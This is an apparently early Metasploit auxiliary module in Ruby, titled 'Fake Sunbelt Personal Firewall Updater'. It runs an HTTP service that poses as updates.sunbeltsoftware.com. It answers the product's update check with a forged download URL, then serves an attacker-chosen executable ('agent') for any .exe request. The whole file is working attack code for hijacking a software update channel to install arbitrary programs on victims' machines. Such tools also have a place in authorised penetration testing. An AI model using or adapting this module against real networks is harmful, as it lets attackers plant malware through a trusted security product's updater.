require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Update
	def initialize
		super(
			'Name'        => 'Fake Sunbelt Personal Firewall  Updater',
			'Version'     => '0.1',
			'Description'    => %q{
				This module provides a HTTP service that
			is designed to fake Sunbelt Firewall updates.
			},
			'Author'      => ['spider'],
			'License'     => MSF_LICENSE
		)

		@base = {	
			'vh' => ['updates.sunbeltsoftware.com'],
			'request' => [{
				'req' => '(/SPURS/spurs.asp)', 
				'type' => 'string', 
				'bin'    => 0,
				'string' => "http://updates.sunbeltsoftware.com/SPURS/Downloads/440/Sunbelt/SKPF/EN/4.6.1861/SPF.4.6.1861.<%RND1%>.exe?MD5=<%MD5%>&SIZE=<%SIZE%>",
				'parse' => 1,
				'file' => '',
			},
			{
				'req' => '.exe', 
				'type' => 'agent', 
				'bin'    => 1,		    
				'string' => '',
				'parse' => 0,
				'file' => ''
			},
			],
			'options' => {  
				'rnd1'  => { 
					'val' => 'RndNum(4)',
					'dynamic' =>1
				},
				'md5'	=> {
					'val' => 'MD5()',
					'dynamic' => 1	
				},	       
				'size'	=> {
					'val' => 'SIZE()',
					'dynamic' => 1	
				}
			}
		}
	end
end
